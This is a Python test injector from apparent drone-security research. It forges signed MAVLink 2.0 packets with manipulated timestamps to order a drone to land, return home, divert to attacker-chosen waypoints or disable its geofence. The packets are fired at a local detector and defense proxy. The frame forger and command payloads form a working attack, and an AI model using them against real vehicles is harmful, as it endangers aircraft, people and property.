#!/usr/bin/env python3
"""
=============================================================================
MULTI-VECTOR MAVLink ATTACKS  —  Cross-Attack Generalization (Task 3)
=============================================================================
Goal: move from a SINGLE attack to an ATTACK CLASS.

The paper shows one instance (a delayed LAND command via timestamp
manipulation, Fig. 23-24). This script generalizes that same
timestamp-manipulation primitive across MANY dangerous command classes,
proving it is a PROTOCOL-LEVEL vulnerability, not a one-off:

    Vector                       Timestamp trick   Dangerous payload
    ------------------------------------------------------------------
    V1  Command Injection: LAND   future clock      DO_SET_MODE -> LAND
    V2  Command Injection: RTL     future clock      DO_SET_MODE -> RTL (hijack)
    V3  Mission Hijack: WAYPOINT   replay (stale)    MISSION_ITEM_INT divert
    V4  Geofence Bypass            future clock      DO_FENCE_ENABLE disable

KEY INSIGHT (the generalization):
    The COMMAND changes every time, but the ATTACK SIGNATURE is always the
    same manipulated signing timestamp. So a timestamp-aware detector/defense
    catches the WHOLE class with one rule set -- independent of the command.

This is a STANDALONE injector (Phase A): it needs no SITL / MAVProxy.
Each packet is fired at BOTH:
    * the detector's mirror port   127.0.0.1:14551  (+ GPS 25101)
    * the defense proxy's input    127.0.0.1:14549  (+ GPS 25102)

Usage:
    python3 multivector_attacks.py          # run all vectors (V1-V4)
    python3 multivector_attacks.py 1        # V1 only  (2/3/4 likewise)

Run alongside:
    Terminal A: python3 realtime_detector_v4.py
    Terminal B: python3 secure_timestamp_defense.py --gps 25102
=============================================================================
"""

import socket, struct, hashlib, time, sys, json

HOST          = '127.0.0.1'
DETECTOR_PORT = 14551            # detector mirror (sees signed packets intact)
DEFENSE_PORT  = 14549            # defense proxy input
GPS_PORT      = 25101            # detector GPS feed
DEFENSE_GPS   = 25102            # defense GPS feed
MAVLINK_EPOCH = 1_420_070_400
SECRET_KEY    = 'key'

# MAVLink command IDs (from the ArduPilot dialect)
CMD_NAV_LAND        = 21
CMD_NAV_RTL         = 20
CMD_DO_SET_MODE     = 176
CMD_DO_FENCE_ENABLE = 207
CMD_NAV_WAYPOINT    = 16
# ArduCopter custom flight-mode numbers
MODE_RTL  = 6
MODE_LAND = 9

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


# ── CRC-16/MCRF4XX (MAVLink x25crc) ──────────────────────────────────────────
def crc16(data: bytes) -> int:
    crc = 0xffff
    for b in data:
        tmp = b ^ (crc & 0xff)
        tmp = (tmp ^ (tmp << 4)) & 0xff
        crc = (crc >> 8) ^ (tmp << 8) ^ (tmp << 3) ^ (tmp >> 4)
    return crc & 0xffff


# ── Generic MAVLink 2.0 signed-frame builder ─────────────────────────────────
def build_signed(msg_id: int, crc_extra: int, payload: bytes,
                 signing_unix: float, seq: int = 0,
                 sysid: int = 255, compid: int = 230) -> bytes:
    """
    Assemble ANY signed MAVLink 2.0 frame with a chosen signing timestamp.
    This is the shared primitive: only msg_id/crc_extra/payload change per
    attack -- the signing block (where the manipulated timestamp lives) is
    identical across every command class.
    """
    key = hashlib.sha256(SECRET_KEY.encode('ascii')).digest()

    # MAVLink payload truncation: drop trailing zero bytes (min length 1)
    while len(payload) > 1 and payload[-1] == 0:
        payload = payload[:-1]

    body = bytearray(
        [len(payload), 0x01, 0x00, seq % 256, sysid, compid]
        + list(msg_id.to_bytes(3, 'little'))
        + list(payload)
    )
    crc_bytes = crc16(bytes(body) + bytes([crc_extra])).to_bytes(2, 'little')

    ts_val   = int((signing_unix - MAVLINK_EPOCH) * 1e5)
    ts_bytes = ts_val.to_bytes(6, 'little')
    link     = bytes([1])
    magic    = bytes([0xfd])

    m = hashlib.sha256()
    m.update(key); m.update(magic); m.update(bytes(body))
    m.update(crc_bytes); m.update(link); m.update(ts_bytes)
    sig = m.digest()[:6]

    return magic + bytes(body) + crc_bytes + link + ts_bytes + sig


# ── Per-message payload builders ─────────────────────────────────────────────
def command_long(command: int, p1=0.0, p2=0.0, p3=0.0, p4=0.0,
                 p5=0.0, p6=0.0, p7=0.0, target_sys=1, target_comp=1) -> bytes:
    # COMMAND_LONG (76): <fffffffHBBB
    return struct.pack('<fffffffHBBB', p1, p2, p3, p4, p5, p6, p7,
                       command, target_sys, target_comp, 0)


def mission_item_int(seq_no: int, command: int, lat_deg: float, lon_deg: float,
                     alt_m: float, target_sys=1, target_comp=1, frame=6) -> bytes:
    # MISSION_ITEM_INT (73): <ffffiifHHBBBBBB
    # frame 6 = MAV_FRAME_GLOBAL_RELATIVE_ALT_INT ; lat/lon in 1e7 degrees
    return struct.pack('<ffffiifHHBBBBBB',
                       0.0, 0.0, 0.0, 0.0,
                       int(lat_deg * 1e7), int(lon_deg * 1e7), alt_m,
                       seq_no, command, target_sys, target_comp,
                       frame, 0, 1, 0)


# ── Transport helpers ────────────────────────────────────────────────────────
def send_both(pkt: bytes):
    sock.sendto(pkt, (HOST, DETECTOR_PORT))   # detector flags it
    sock.sendto(pkt, (HOST, DEFENSE_PORT))    # defense blocks it


def send_gps(gps_unix: float):
    blob = json.dumps({'time_unix_usec': int(gps_unix * 1e6),
                       'time_usec':      int(gps_unix * 1e6)}).encode()
    sock.sendto(blob, (HOST, GPS_PORT))
    sock.sendto(blob, (HOST, DEFENSE_GPS))


def banner(title):
    print(f'\n{"─"*60}\n  {title}\n{"─"*60}')


# ── Attack vectors ───────────────────────────────────────────────────────────
def v1_land_injection():
    banner('V1  Command Injection -> forced LAND  (timestamp: future clock)')
    now = time.time()
    send_gps(now)
    payload = command_long(CMD_DO_SET_MODE, p1=1, p2=MODE_LAND)   # DO_SET_MODE->LAND
    for i in range(3):
        send_both(build_signed(76, 152, payload, now + 3600, seq=i))  # +1h future
        time.sleep(0.3)
    print('  Payload  : DO_SET_MODE -> LAND (mode 9)')
    print('  Detector : ATTACK-1 (future timestamp)')
    print('  Defense  : BLOCK L1 (timestamp outside window)')


def v2_rtl_hijack():
    banner('V2  Command Injection -> RTL hijack  (timestamp: future clock)')
    now = time.time()
    send_gps(now)
    payload = command_long(CMD_DO_SET_MODE, p1=1, p2=MODE_RTL)    # DO_SET_MODE->RTL
    for i in range(3):
        send_both(build_signed(76, 152, payload, now + 7200, seq=i))  # +2h future
        time.sleep(0.3)
    print('  Payload  : DO_SET_MODE -> RTL (mode 6) -- forces drone home mid-mission')
    print('  Detector : ATTACK-1 (future timestamp)')
    print('  Defense  : BLOCK L1 (timestamp outside window)')


def v3_waypoint_hijack():
    banner('V3  Mission Hijack -> WAYPOINT divert  (timestamp: replay / stale)')
    # Replay a signed mission item with an OLD timestamp to redirect the drone
    # to attacker-chosen coordinates (a field far from the safe zone).
    past = time.time() - 166_910_935          # ~2021 (stale-replay signature)
    ATT_LAT, ATT_LON, ATT_ALT = -35.500000, 149.500000, 30.0   # attacker target
    for i in range(3):
        payload = mission_item_int(seq_no=i, command=CMD_NAV_WAYPOINT,
                                   lat_deg=ATT_LAT, lon_deg=ATT_LON, alt_m=ATT_ALT)
        send_both(build_signed(73, 38, payload, past + i * 0.1, seq=i))
        time.sleep(0.4)
    print(f'  Payload  : MISSION_ITEM_INT -> ({ATT_LAT}, {ATT_LON}) @ {ATT_ALT}m')
    print('  Detector : ATTACK-4 (replay / past timestamp)')
    print('  Defense  : BLOCK L1 (stale timestamp)')


def v4_geofence_bypass():
    banner('V4  Geofence Bypass -> disable fence  (timestamp: future clock)')
    now = time.time()
    send_gps(now)
    payload = command_long(CMD_DO_FENCE_ENABLE, p1=0)   # p1=0 -> DISABLE fence
    for i in range(3):
        send_both(build_signed(76, 152, payload, now + 5400, seq=i))  # +1.5h future
        time.sleep(0.3)
    print('  Payload  : DO_FENCE_ENABLE(0) -- turns the geofence OFF')
    print('  Detector : ATTACK-1 (future timestamp)')
    print('  Defense  : BLOCK L1 (timestamp outside window)')


# ── Main ─────────────────────────────────────────────────────────────────────
vectors = {'1': v1_land_injection, '2': v2_rtl_hijack,
           '3': v3_waypoint_hijack, '4': v4_geofence_bypass}

print('=' * 60)
print('  MULTI-VECTOR MAVLink ATTACKS — Cross-Attack Generalization')
print(f'  Detector : {HOST}:{DETECTOR_PORT} (GPS {GPS_PORT})')
print(f'  Defense  : {HOST}:{DEFENSE_PORT} (GPS {DEFENSE_GPS})')
print('=' * 60)
print('  Same timestamp primitive, four different command classes.')

if len(sys.argv) > 1 and sys.argv[1] in vectors:
    vectors[sys.argv[1]]()
else:
    for fn in vectors.values():
        fn()
        time.sleep(0.8)

print('\nDone. The manipulated TIMESTAMP is the common signature across all')
print('four command classes — one detection rule set covers the whole class.')
